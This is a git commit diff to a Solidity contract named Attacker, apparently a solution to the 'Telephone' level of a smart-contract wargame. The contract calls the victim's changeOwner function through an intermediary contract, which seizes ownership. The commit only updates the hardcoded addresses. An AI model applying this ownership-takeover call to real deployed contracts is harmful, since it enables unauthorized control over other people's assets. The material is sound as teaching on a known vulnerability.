481bddf7e0e1f3f1bac15d7dcd893622cfa4518b
DappDojo <gimer@dappdojo.com>
2023-06-19 18:14:54 -0600

    change Telephone solution

--- 4.Telephone/Attacker.sol
+++ 4.Telephone/Attacker.sol
@@ -3,14 +3,13 @@ pragma solidity ^0.8.0;
 
 contract Attacker {
     // The Telephone contract instance address
-    address victim = address(0x8af4cE789946810C13684a2A2c1Ac7E27d179fC3);
+    address victim = address(0x9C2e3a52AB6898977d4eE360C55818DaB70dd829);
 
     function callVictim() external returns (bool)
     {
         // Send the new owner address as a parameter.
-        (bool success, ) = victim.call(abi.encodeWithSignature("changeOwner(address)", 0x8af4cE789946810C13684a2A2c1Ac7E27d179fC3));
+        (bool success, ) = victim.call(abi.encodeWithSignature("changeOwner(address)", 0x9156b5Bf1789F6d977296ce02A10eaE5330Bb5eF));
 
         return success;
     }
-  
 }
